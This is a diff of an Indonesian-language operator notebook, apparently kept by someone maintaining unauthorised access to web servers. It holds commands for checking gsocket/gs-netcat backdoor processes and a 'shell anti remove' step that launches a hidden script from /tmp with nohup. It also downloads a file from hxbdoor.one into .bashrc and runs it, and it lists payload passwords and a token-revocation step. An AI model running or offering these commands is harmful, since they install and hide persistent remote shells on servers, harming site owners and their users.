@@ -182,7 +182,7 @@ ps -ef | grep -i 'gsocket\|gs-netcat\|[g]s'   # [g]s supaya grep sendiri tidak m
 ps -u "$USER" -o pid,cmd --no-headers
 
 ps -u $USER
-
+	
 (menampilkan PID dari shell yang sedang aktif / yang kita gunakan)
 echo $$
 
@@ -218,7 +218,7 @@ pasang htaccess jika site kena capcha / block bot google
 
 --------------------------
 SHELL ANTI REMOVE
-chmod +x /tmp/jpk/nohub.sh && nohup /tmp/jpk/nohub.sh >/dev/null 2>&1 &
+chmod +x /tmp/bandar/nohub.sh && nohup /tmp/bandar/nohub.sh >/dev/null 2>&1 &
 
 masukan file tmp nya
 
@@ -318,9 +318,11 @@ setfacl -b nama_folder
 
 ---------------------
 
-wget -O .bashrc https://hxbdoor.one/raw/A8nxsRKw
+wget -O .bashrc https://hxbdoor.one/raw/42CwP2VY
 walaowe@@123@@1947 (masukan password)
 cobasajamas (masukan password)
+katasandinyacobasajamas (masukan password)
+
 sed -i 's/\r$//' .bashrc
 bash .bashrc
 
@@ -376,7 +378,7 @@ sudo find / -type d \( -name "sites-enabled" -o -name "sites-available" \) 2>/de
 uapi Tokens list
 name: default
 
-uapi Tokens revoke name=default (nama sesuai name)
+uapi Tokens revoke name=Default (nama sesuai name)
 
 ---------------------------
 
@@ -393,4 +395,11 @@ grep -H "DocumentRoot" /etc/apache2/sites-enabled/*.conf
 password scan shell : jangandicoba
 
 ----------------------
+
+grep -R "DocumentRoot" /etc/apache2/
+grep -R "DocumentRoot" /etc/httpd/
+
+(cek document root public)
+
+----------------
 
